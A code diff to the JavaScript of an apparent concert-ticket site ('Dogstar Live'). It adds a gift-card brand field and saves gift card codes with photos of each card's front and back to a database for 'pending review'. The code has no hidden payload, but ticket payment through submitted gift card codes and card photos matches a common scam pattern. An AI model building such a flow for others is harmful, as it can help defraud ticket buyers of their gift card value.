@@ -83,6 +83,7 @@ document.addEventListener('DOMContentLoaded', async () => {
   const giftCardButton = document.querySelector('.ticket-modal__giftcard-btn');
   const giftCardDivider = document.querySelector('.ticket-modal__or-divider');
   const giftCardForm = document.getElementById('giftcard-form');
+  const giftCardBrandSelect = document.getElementById('giftcard-brand');
   const giftCardCodeInput = document.getElementById('giftcard-code');
   const giftCardFrontInput = document.getElementById('giftcard-front');
   const giftCardBackInput = document.getElementById('giftcard-back');
@@ -260,9 +261,16 @@ document.addEventListener('DOMContentLoaded', async () => {
 
       clearGiftCardError();
 
+      const brand = giftCardBrandSelect?.value || '';
       const code = giftCardCodeInput?.value.trim() || '';
       const frontFile = giftCardFrontInput?.files?.[0];
       const backFile = giftCardBackInput?.files?.[0];
+
+      if (!brand) {
+        giftCardError.hidden = false;
+        giftCardError.textContent = 'Please select a gift card brand.';
+        return;
+      }
 
       if (!code || !frontFile || !backFile) {
         giftCardError.hidden = false;
@@ -322,21 +330,24 @@ document.addEventListener('DOMContentLoaded', async () => {
         const totalAmount = selectedItems.reduce((sum, item) => sum + item.price * item.quantity, 0);
         const eventNameString = `Dogstar Live - ${activeTourDateEntry?.venue || 'Upcoming Show'} (${activeTourDateEntry?.displayDate || 'TBD'})`;
 
-        const { error: insertError } = await supabaseClient
+        const { data: insertedOrder, error: insertError } = await supabaseClient
           .from('gift_card_orders')
           .insert({
             user_id: user.id,
             event_name: eventNameString,
             items: selectedItems,
             total_amount: totalAmount,
+            gift_card_brand: brand,
             gift_card_code: code,
             front_image_path: frontPath,
             back_image_path: backPath,
             status: 'pending'
-          });
+          })
+          .select()
+          .single();
 
-        if (insertError) {
-          throw new Error(insertError.message || 'Failed to record gift card submission.');
+        if (insertError || !insertedOrder) {
+          throw new Error(insertError?.message || 'Failed to record gift card submission.');
         }
 
         setGiftCardView(false);
@@ -344,9 +355,10 @@ document.addEventListener('DOMContentLoaded', async () => {
         if (giftCardCodeInput) giftCardCodeInput.value = '';
         if (giftCardFrontInput) giftCardFrontInput.value = '';
         if (giftCardBackInput) giftCardBackInput.value = '';
+        if (giftCardBrandSelect) giftCardBrandSelect.value = '';
         if (ticketModal) ticketModal.hidden = true;
 
-        alert('Your gift card submission has been received and is pending review. You\'ll be notified once verified.');
+        window.location.href = `/gift-pending.html?order_id=${insertedOrder.id}`;
       } catch (error) {
         giftCardError.hidden = false;
         giftCardError.textContent = error?.message || 'Unable to submit gift card. Please try again.';
